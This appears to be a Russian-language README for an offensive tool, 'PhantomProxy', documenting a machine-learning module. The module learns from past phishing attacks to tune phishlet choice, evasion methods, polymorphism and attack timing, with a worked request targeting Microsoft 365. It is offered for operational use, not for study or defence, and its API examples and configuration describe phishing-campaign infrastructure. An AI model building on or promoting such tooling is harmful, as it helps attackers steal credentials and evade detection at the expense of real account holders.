# 🤖 ML OPTIMIZATION MODULE

Самообучающаяся система оптимизации атак

---

## 📋 ОПИСАНИЕ

ML Optimization модуль который:

1. **Собирает данные** об успешных/неуспешных атаках
2. **Обучает XGBoost модель** на этих данных
3. **Генерирует рекомендации** по оптимизации
4. **Подбирает оптимальные параметры** для кампаний

---

## 🚀 ВОЗМОЖНОСТИ

### ✅ Automated Learning

- **XGBoost Classifier** — предсказание успеха атаки
- **Feature Importance** — какие параметры важнее
- **Continuous Learning** — обучение на новых данных

### ✅ Smart Recommendations

- **Phishlet оптимизация** — какой шаблон лучше
- **Timing оптимизация** — лучшее время для атак
- **Evasion оптимизация** — какие методы обхода работают

### ✅ Optimal Parameters

- **Auto-tuning** — автоматический подбор параметров
- **Service-specific** — рекомендации для каждого сервиса
- **Confidence scoring** — уверенность в рекомендациях

---

## 📡 API ENDPOINTS

### POST /api/v1/ml/train

Обучение ML модели.

**Request:**
```json
{
  "min_samples": 100,
  "test_size": 0.2
}
```

**Response:**
```json
{
  "success": true,
  "metrics": {
    "accuracy": 0.85,
    "precision": 0.82,
    "recall": 0.78,
    "samples": 150
  },
  "feature_importance": {
    "polymorphic_high": 0.35,
    "browser_pool": 0.25,
    "evasion_score": 0.20
  }
}
```

### POST /api/v1/ml/recommendations

Получение рекомендаций.

**Response:**
```json
{
  "success": true,
  "recommendations": [
    {
      "category": "browser_pool",
      "priority": "high",
      "recommendation": "Enable browser pool",
      "expected_improvement": 25.0,
      "confidence": 0.9
    }
  ],
  "optimal_params": {
    "polymorphic_level": "high",
    "browser_pool_enabled": true,
    "best_time_of_day": 14
  }
}
```

### POST /api/v1/ml/feedback

Отправка фидбека об атаке.

### GET /api/v1/ml/stats

Статистика ML модуля.

---

## ⚙️ КОНФИГУРАЦИЯ

### config.yaml

```yaml
# ML Optimization
ml_optimization:
  enabled: true
  min_samples: 100
  auto_train: true
  train_interval: 3600  # секунд
```

---

## 💡 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ

### Обучение модели

```bash
curl -X POST http://localhost:8080/api/v1/ml/train \
  -H "Authorization: Bearer secret" \
  -H "Content-Type: application/json" \
  -d '{"min_samples": 100}'
```

### Получение рекомендаций

```bash
curl -X POST http://localhost:8080/api/v1/ml/recommendations \
  -H "Authorization: Bearer secret" \
  -H "Content-Type: application/json" \
  -d '{
    "target_service": "Microsoft 365",
    "current_params": {
      "polymorphic_level": "medium",
      "browser_pool_enabled": false
    }
  }'
```

---

## 📈 МОНИТОРИНГ

### Метрики

- Accuracy модели
- Precision/Recall
- Количество атак в базе
- Success rate кампаний

---

**Версия:** 1.0.0  
**Автор:** PhantomProxy Team  
**Лицензия:** MIT
